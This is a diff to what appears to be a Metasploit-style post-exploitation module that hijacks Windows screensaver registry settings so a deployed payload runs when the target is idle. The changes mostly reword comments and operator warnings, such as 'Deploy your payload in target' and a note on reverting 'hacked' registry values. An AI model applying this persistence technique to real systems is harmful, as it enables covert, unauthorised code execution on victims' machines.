@@ -234,7 +234,7 @@ def run
       # make sure the retrieve values are not empty strings
       if scrnsave_data.nil? || scrnsave_data == '' || scrnsave_data == ' '
         print_warning("Reg value contains empty data, set module default data.")
-        scrnsave_data = 'C:\\\Windows\\\System32\\\Mystify.src' # windows 10 default data
+        scrnsave_data = '%windir%\\\System32\\\Mystify.src' # windows 10 default data
         Rex::sleep(0.5)
       end
     print_status("Retriving default ScreenSaveTimeOut registry value data.")
@@ -243,7 +243,7 @@ def run
       # make sure the retrieve values are not empty strings
       if scrnsave_timeout.nil? || scrnsave_timeout == '' || scrnsave_timeout == ' '
         print_warning("Reg value contains empty data, set module default data.")
-        scrnsave_timeout = "180" # 180 sec == 3 minuts
+        scrnsave_timeout = "180" # 180 sec == 3 minuts waiting
         Rex::sleep(0.5)
       end
     print_status("Retriving default ScreenSaverIsSecure registry value data.")
@@ -252,7 +252,7 @@ def run
       # make sure the retrieve values are not empty strings
       if scrnsave_issecure.nil? || scrnsave_issecure == '' || scrnsave_issecure == ' '
         print_warning("Reg value contains empty data, set module default data.")
-        scrnsave_issecure = "0" # 0 == screensave secure off
+        scrnsave_issecure = "0" # 0 == set screensave secure off
         Rex::sleep(0.5)
       end
     print_status("Retriving default ScreenSaveActive registry value data.")
@@ -261,13 +261,14 @@ def run
       # make sure the retrieve values are not empty strings
       if scrnsave_active.nil? || scrnsave_active == '' || scrnsave_active == ' '
         print_warning("Reg value contains empty data, set module default data.")
-        scrnsave_active = "1" # 1 == screensave active on
+        scrnsave_active = "1" # 1 == set screensave active on
         Rex::sleep(0.5)
       end
 
 
     #
-    # create revert resource file (local PC)
+    # create revert.rc resource file (in attackers PC)
+    # (To revert target registry hacked values to default before the hack)
     #
     rand = Rex::Text.rand_text_alpha(5)
     print_good("Writing revert_#{rand}.rc resource file (local).")
@@ -298,8 +299,9 @@ def run
         Rex::sleep(0.5)
       else
         print_error("NOT FOUND: #{app_path}")
-        print_warning("Deploy your [payload] before using this module.")
-        print_warning("OR point to one existing application absoluct path.")
+        print_warning("Deploy your payload in target before using this module.")
+        print_warning("OR point to one existing application absoluct path. (test)")
+        print_warning("Also remmeber to use double back slashs in remote paths.")
         Rex::sleep(1.5)
         return nil
       end
@@ -352,7 +354,7 @@ def run
        print_line("Trigger exploit  : every #{time_out} sec (if inactive)")
        print_line("Revert script    : resource #{loot_folder}/revert_#{rand}.rc")
        print_line("-----------------------------------------------------")
-       print_warning("Target system needs to logoff for changes take effect.")
+       print_warning("HINT: Target system needs to logoff for changes take effect.")
        Rex::sleep(1.5)
 
 
